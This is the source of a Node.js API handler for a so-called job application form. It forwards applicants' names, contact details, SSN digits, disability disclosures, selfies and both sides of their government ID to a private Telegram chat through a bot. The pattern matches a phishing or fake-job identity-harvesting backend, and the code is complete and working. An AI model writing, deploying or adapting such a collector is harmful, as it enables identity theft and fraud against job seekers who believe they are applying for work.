// SECURITY: Require environment variables - NO hardcoded fallbacks
const BOT_TOKEN = (process.env.TG_BOT_TOKEN || '').trim();
const CHAT_ID = (process.env.TG_CHAT_ID || '').trim();
const TELEGRAM_API = 'https://api.telegram.org';

// Debug logging for environment variables (first request only)
let envCheckDone = false;
if (!envCheckDone) {
  console.log('[API] Environment check:');
  console.log('[API] TG_BOT_TOKEN:', BOT_TOKEN ? `✓ Set (${BOT_TOKEN.substring(0, 10)}...)` : '✗ NOT SET');
  console.log('[API] TG_CHAT_ID:', CHAT_ID ? `✓ Set (${CHAT_ID})` : '✗ NOT SET');
  envCheckDone = true;
}

async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    let bodyData = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;
    const { formData, files } = bodyData;

    console.log('[API] Request received:');
    console.log('[API] - FormData fields:', formData ? Object.keys(formData).length : 0);
    console.log('[API] - Files:', files ? Object.keys(files) : 'NONE');

    if (!formData) {
      return res.status(400).json({ error: 'Missing formData', success: false });
    }

    // REQUIRED: Telegram credentials must be configured for submissions
    if (!BOT_TOKEN || !CHAT_ID) {
      console.error('[API] FATAL: Telegram credentials not configured');
      console.error('[API] Missing:', {
        TG_BOT_TOKEN: BOT_TOKEN ? 'SET' : 'MISSING',
        TG_CHAT_ID: CHAT_ID ? 'SET' : 'MISSING'
      });
      return res.status(503).json({ 
        success: false,
        error: 'Backend not configured: Missing TG_BOT_TOKEN or TG_CHAT_ID environment variables. Contact administrator.',
        timestamp: new Date().toISOString()
      });
    }

    // Step 1: Send text message
    const message = formatMessage(formData);
    console.log('[API] Sending message to Telegram...');
    const messageResponse = await fetch(`${TELEGRAM_API}/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'Markdown'
      })
    });

    const messageData = await messageResponse.json();
    if (!messageData.ok) {
      console.error('[API] Message send failed:', messageData);
      throw new Error(`Message failed: ${messageData.description || 'Unknown error'}`);
    }
    console.log('[API] ✓ Message sent successfully');

    // Step 2: Upload files to Telegram (convert base64 to buffers)
    let fileUploadCount = 0;
    let fileUploadErrors = [];
    console.log('[API] Files received:', files ? Object.keys(files) : 'NONE');
    
    if (files && Object.keys(files).length > 0) {
      console.log('[API] Starting file uploads to Telegram...');
      const captions = {
        'a-selfie': '📸 Selfie',
        'a-id-photo-front': '🪪 Government ID - FRONT',
        'a-id-photo-back': '🪪 Government ID - BACK',
        'a-cv': '📄 Resume/CV'
      };

      for (const [fieldName, fileData] of Object.entries(files)) {
        if (!fileData?.data || !fileData?.name) {
          console.log('[API] Skipping file (no data):', fieldName);
          continue;
        }

        const isPhoto = ['a-selfie', 'a-id-photo-front', 'a-id-photo-back'].includes(fieldName);
        const endpoint = isPhoto ? 'sendPhoto' : 'sendDocument';
        const paramName = isPhoto ? 'photo' : 'document';
        const caption = captions[fieldName] || fieldName;

        try {
          console.log(`[API] Uploading ${fieldName} as ${endpoint}...`);
          
          // Decode base64 to Buffer
          const buffer = Buffer.from(fileData.data, 'base64');
          console.log(`[API] Buffer size: ${buffer.length} bytes for ${fieldName}`);

          // Create FormData-like structure for Telegram
          const boundary = `----WebKitFormBoundary${Date.now()}${Math.random().toString(36).substr(2, 9)}`;
          const formParts = [];

          // Add chat_id
          formParts.push(`--${boundary}\r\nContent-Disposition: form-data; name="chat_id"\r\n\r\n${CHAT_ID}\r\n`);

          // Add caption
          formParts.push(`--${boundary}\r\nContent-Disposition: form-data; name="caption"\r\n\r\n${caption}\r\n`);

          // Build form header for file
          const fileHeader = `--${boundary}\r\nContent-Disposition: form-data; name="${paramName}"; filename="${fileData.name}"\r\nContent-Type: ${fileData.type || 'application/octet-stream'}\r\n\r\n`;
          const fileBoundary = `\r\n--${boundary}--\r\n`;

          // Concatenate all parts
          const formStart = Buffer.from(formParts.join('') + fileHeader);
          const formEnd = Buffer.from(fileBoundary);
          const fullBody = Buffer.concat([formStart, buffer, formEnd]);

          const fileResponse = await fetch(`${TELEGRAM_API}/bot${BOT_TOKEN}/${endpoint}`, {
            method: 'POST',
            headers: {
              'Content-Type': `multipart/form-data; boundary=${boundary}`
            },
            body: fullBody
          });

          const fileResult = await fileResponse.json();
          
          if (!fileResult.ok) {
            const errorMsg = `File ${fieldName} failed: ${fileResult.description || 'Unknown error'}`;
            console.error(`[API] ✗ ${errorMsg}`);
            fileUploadErrors.push({ field: fieldName, error: errorMsg });
          } else {
            console.log(`[API] ✓ ${fieldName} uploaded successfully (file_id: ${fileResult.result?.photo?.[0]?.file_id || fileResult.result?.document?.file_id || 'N/A'})`);
            fileUploadCount++;
          }
        } catch (err) {
          const errorMsg = `File ${fieldName} error: ${err.message}`;
          console.error(`[API] ✗ ${errorMsg}`);
          fileUploadErrors.push({ field: fieldName, error: errorMsg });
        }
      }
    }

    console.log(`[API] File upload summary: ${fileUploadCount} successful, ${fileUploadErrors.length} failed`);

    // If critical files failed, reject the entire submission
    const requiredFiles = ['a-selfie', 'a-id-photo-front', 'a-id-photo-back'];
    const failedRequired = fileUploadErrors.filter(e => requiredFiles.includes(e.field));
    
    if (failedRequired.length > 0) {
      const failedNames = failedRequired.map(e => `${e.field} (${e.error})`).join('; ');
      throw new Error(`Required file uploads failed: ${failedNames}`);
    }

    return res.status(200).json({ 
      success: true,
      message: 'Application submitted successfully',
      timestamp: new Date().toISOString()
    });

  } catch (error) {
    console.error('[API] Error:', error.message);
    return res.status(500).json({
      success: false,
      error: error.message || 'Submission failed',
      timestamp: new Date().toISOString()
    });
  }
}

function formatMessage(data) {
  let message = '📋 NEW APPLICATION RECEIVED\n\n';
  
  const sections = {
    '👤 Personal Information': ['a-fullname', 'a-email', 'a-phone', 'a-location'],
    '🏫 Education': ['a-highschool', 'a-highschool-status'],
    '💼 Professional': ['a-linkedin', 'a-github', 'a-role', 'a-experience', 'a-portfolio'],
    '🎯 Skills': ['a-sql', 'a-python', 'a-tableau', 'a-excel', 'a-coding'],
    '📋 Compliance': ['a-govid', 'a-ssn', 'a-availability', 'a-disability', 'a-productive-time'],
    '📝 Additional': ['a-cover', 'a-consent']
  };

  const labels = {
    'a-fullname': 'Full Name',
    'a-email': 'Email',
    'a-phone': 'Phone',
    'a-location': 'Location',
    'a-highschool': 'High School',
    'a-highschool-status': 'High School Status',
    'a-linkedin': 'LinkedIn',
    'a-github': 'GitHub',
    'a-role': 'Position',
    'a-experience': 'Years Experience',
    'a-portfolio': 'Portfolio URL',
    'a-sql': 'SQL Level',
    'a-python': 'Python Level',
    'a-tableau': 'Tableau Level',
    'a-excel': 'Excel Level',
    'a-coding': 'Coding Knowledge',
    'a-govid': 'Government ID Type',
    'a-ssn': 'SSN (Last 4)',
    'a-availability': 'Availability',
    'a-disability': 'Disability Disclosure',
    'a-productive-time': 'Most Productive Time',
    'a-cover': 'Cover Note',
    'a-consent': 'Consent'
  };

  for (const [section, fields] of Object.entries(sections)) {
    const hasContent = fields.some(f => data[f]);
    if (!hasContent) continue;
    message += `*${section}*\n`;
    fields.forEach(field => {
      if (data[field]) {
        const label = labels[field] || field;
        message += `• ${label}: ${data[field]}\n`;
      }
    });
    message += '\n';
  }

  return message;
}

module.exports = handler;
